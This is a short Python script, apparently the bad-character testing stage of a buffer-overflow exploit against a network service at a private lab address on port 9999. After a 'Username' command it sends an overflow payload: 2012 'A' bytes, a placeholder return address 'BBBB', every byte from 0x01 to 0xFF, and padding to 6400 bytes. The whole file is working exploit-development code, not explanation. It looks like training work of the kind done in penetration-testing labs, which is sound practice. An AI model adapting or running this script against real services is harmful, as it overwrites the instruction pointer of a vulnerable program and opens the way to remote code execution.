#!/usr/bin/python3
import socket

host, port = "192.168.56.102", 9999

all_chars = bytearray(range(1,256))

bad_chars = [
        #b"\x04",
        ]


# Add bad char to bad_chars as we discover them
for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char, b"")

cmd = b"Username\r\n"
pattern_length = 6400 # Documentation and keep for length retention
offset = 2012
new_eip = b"BBBB"


payload = b"".join([
            b"A" * offset,
            new_eip,
            all_chars,
            b"C" * (pattern_length - len(new_eip) - offset - len(all_chars)),
            b"\r",
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(cmd)
    s.recv(1024)
    s.send(payload)
